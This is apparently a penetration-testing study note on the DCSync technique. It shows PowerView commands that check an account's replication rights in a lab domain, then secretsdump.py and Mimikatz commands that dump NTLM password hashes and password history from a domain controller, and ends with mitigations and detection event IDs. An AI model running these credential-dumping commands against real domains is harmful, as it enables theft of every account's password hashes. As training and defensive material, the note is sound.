# DCSync

### Overview

DCSync is a powerful attack technique used to extract password hashes from Active Directory (AD) by impersonating a domain controller. This method exploits the Directory Replication Service Remote Protocol to request replication of user credentials, allowing attackers to retrieve NTLM password hashes.

### Understanding DCSync

DCSync requires control over an account with **domain replication privileges**, specifically `DS-Replication-Get-Changes-All`. Typically, Domain Admins and Enterprise Admins have these privileges by default. However, other accounts may be granted these rights, making them valuable targets.


#### Viewing group membership
```powershell
Get-DomainUser -Identity adunn | select samaccountname, objectsid, memberof, useraccountcontrol
```

#### Checking replication rights
```powershell
$sid = "S-1-5-21-3842939050-3880317879-2865463114-1164"
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get') } | ? { $_.SecurityIdentifier -match $sid } | select AceQualifier, ObjectDN, ActiveDirectoryRights, SecurityIdentifier, ObjectAceType | fl
```

If `DS-Replication-Get-Changes-All` appears in the output, `adunn` has the required privileges.

#### secretsdump.py
```bash
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
```

#### Target specific user
```bash
secretsdump.py -just-dc-user administrator INLANEFREIGHT/adunn@172.16.5.5
```

#### Mimikatz
```powershell
privilege::debug
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```

### Additional Enumeration
```powershell
secretsdump.py -history -just-dc INLANEFREIGHT/adunn@172.16.5.5
Get-ADUser -Filter * -Properties PwdLastSet | select SamAccountName, PwdLastSet
```

### Mitigation Strategies

1. **Restrict Replication Privileges**: Limit `DS-Replication-Get-Changes-All` to only domain controllers.
2. **Enable Monitoring & Logging**:
   * Use **Event ID 4662** (Audit Directory Service Access) to detect abnormal replication requests.
   * Monitor **Event ID 4742** (user account changes) for privilege escalation attempts.
3. **Implement the Principle of Least Privilege (PoLP)**: Ensure only necessary users have replication rights.
4. **Use Managed Service Accounts**: Replace regular user accounts for sensitive operations.
5. **Enable LAPS (Local Administrator Password Solution)**: Prevent local admin credential reuse.
